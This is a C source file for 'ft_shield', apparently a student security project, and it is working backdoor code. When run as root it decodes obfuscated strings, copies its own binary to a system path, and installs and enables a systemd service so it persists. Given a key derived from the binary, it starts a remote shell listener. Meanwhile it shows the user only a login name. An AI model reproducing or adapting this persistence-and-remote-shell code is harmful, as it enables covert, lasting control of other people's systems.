#include "constants.h"
#include "digest.h"
#include "mem.h"
#include "shield.h"
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static int
generate_binary() {
    const char *src_path = (char *)strings[PROC_SELF_EXE].data, *target_path = (char *)strings[BIN_FT_SHIELD].data;
    int src_fd = open(src_path, O_RDONLY);
    if (src_fd == -1) {
        __log(stderr, "(open [path %s]) Error: %s\n", src_path, strerror(errno));
        return -1;
    }
    int target_fd = open(target_path, O_CREAT | O_TRUNC | O_RDWR, 0755);
    if (target_fd == -1) {
        __log(stderr, "(open [path %s]) Error: %s\n", target_path, strerror(errno));
        close(src_fd);
        return -1;
    }

    ssize_t bytes_read;
    uint8_t buf[BLOCK_SIZE];
    while ((bytes_read = read(src_fd, buf, sizeof(buf))) != 0) {
        if (bytes_read == -1) {
            __log(stderr, "(read [path %s] [fd %d]) Error: %s", src_path, src_fd, strerror(errno));
            close(src_fd);
            close(target_fd);
            return -1;
        }
        if (write(target_fd, buf, bytes_read) != bytes_read) {
            __log(stderr, "(write [path %s] [fd %d]) Error: %s", target_path, target_fd, strerror(errno));
            close(src_fd);
            close(target_fd);
            return -1;
        }
    }

    close(src_fd);

    if (fchmod(target_fd, 0755) == -1) {
        __log(stderr, "(chmod [path %s]) Error: %s\n", target_path, strerror(errno));
        return -1;
    }

    close(target_fd);

    return 0;
}

int
configure_systemd(char *const activation_key) {
    const char *systemd_config_path = (const char *)strings[SYSTEMD_CONFIG_PATH].data;
    int fd = open(systemd_config_path, O_TRUNC | O_CREAT | O_WRONLY, 0644);
    if (fd == -1) {
        __log(stderr, "(open [path %s]) Error: %s\n", systemd_config_path, strerror(errno));
        return -1;
    }

    const char *systemd_config = (const char *)strings[SYSTEMD_CONFIG].data;
    // 64 bytes activation key will be inserted into SYSTEMD_CONFIG, -2 for %s
    const ssize_t buf_len = strings[SYSTEMD_CONFIG].len + ACTIVATION_KEY_LEN - 2;
    // buf_len is guaranteed to be max 278 here
    char buf[buf_len];
    snprintf(buf, sizeof(buf), systemd_config, activation_key);

    if (write(fd, buf, buf_len) != buf_len) {
        if (errno != 0) {
            __log(stderr, "(write [path %s] [fd %d]) Error: %s\n", systemd_config_path, fd, strerror(errno));
        } else {
            __log(stderr, "(write [path %s] [fd %d]) Unknown error\n", systemd_config_path, fd);
        }
        close(fd);
        return -1;
    }

    close(fd);
    return 0;
}

int
start_service() {
    // If the service was already running and the configuration changed, 'systemctl start' outputs a warning message.
    // 'systemctl daemon-reload' prevents this by reloading units before starting ft_shield.
    const char *reload_cmd = (char *)strings[SYSTEMCTL_DAEMON_RELOAD].data;
    if (system(reload_cmd) == -1) {
        __log(stderr, "(system [cmd %s]) Error: %s\n", reload_cmd, strerror(errno));
        return -1;
    }

    const char *start_cmd = (char *)strings[SYSTEMCTL_START_FT_SHIELD].data;
    if (system(start_cmd) == -1) {
        __log(stderr, "(system [cmd %s]) Error: %s\n", start_cmd, strerror(errno));
        return -1;
    }

    const char *enable_cmd = (char *)strings[SYSTEMCTL_ENABLE_FT_SHIELD].data;
    if (system(enable_cmd) == -1) {
        __log(stderr, "(system [cmd %s]) Error: %s\n", start_cmd, strerror(errno));
        return -1;
    }
    return 0;
}

int
disable_service() {
    const char *disable_command = (char *)strings[SYSTEMCTL_STOP_FT_SHIELD].data;
    if (system(disable_command) == -1) {
        __log(stderr, "(system [cmd %s]) Error: %s\n", disable_command, strerror(errno));
        return -1;
    }
    return 0;
}

int
get_activation_key(char *const out) {
    const char *key_src = (char *)strings[PROC_SELF_EXE].data;
    int fd = open(key_src, O_RDONLY);
    if (fd == -1) {
        __log(stderr, "(open [path %s]) Error: %s\n", key_src, strerror(errno));
        return -1;
    }
    if (read(fd, out, ACTIVATION_KEY_LEN) != ACTIVATION_KEY_LEN) {
        __log(stderr, "(read [path %s] [fd %d]) Error: %s\n", key_src, fd, strerror(errno));
        close(fd);
        return -1;
    }

    close(fd);

    Sha256StreamingContext ctx = {0};
    sha256_stream_init(&ctx);
    sha256_stream_update(&ctx, (uint8_t *)out, ACTIVATION_KEY_LEN);
    sha256_stream_final(&ctx, out);

    return 0;
}

bool
is_service_start(char *input, char *activation_key) {
    if (ft_memcmp(input, activation_key, ACTIVATION_KEY_LEN + 1) != 0) {
        return false;
    }

    return true;
}

int
main(int ac, char **av, char **env) {
    if (getuid() != 0) {
        fprintf(stderr, "Error: ft_shield must be ran as root\n");
        return 1;
    }

    decode_strings(strings, sizeof(strings) / sizeof(strings[0]));

    char activation_key[ACTIVATION_KEY_LEN + 1] = {0};
    if (get_activation_key(activation_key) == -1) {
        return 0;
    }

    if (ac == 2 && is_service_start(av[1], activation_key)) {
        return remote_shell_listener_init(env);
    }

    printf("abied-ch\n");

#if DEBUG == 1
    __log(stdout, "DEBUG=1\n");
    if (disable_service() == -1) {
        return 1;
    }
    if (generate_binary() == -1) {
        return 1;
    }
    if (configure_systemd(activation_key) == -1) {
        return 1;
    }
    if (start_service() == -1) {
        return 1;
    }
#else
    if (disable_service() != -1 && generate_binary() != -1 && configure_systemd(activation_key) != -1 && start_service() != -1) {
    }
#endif
}
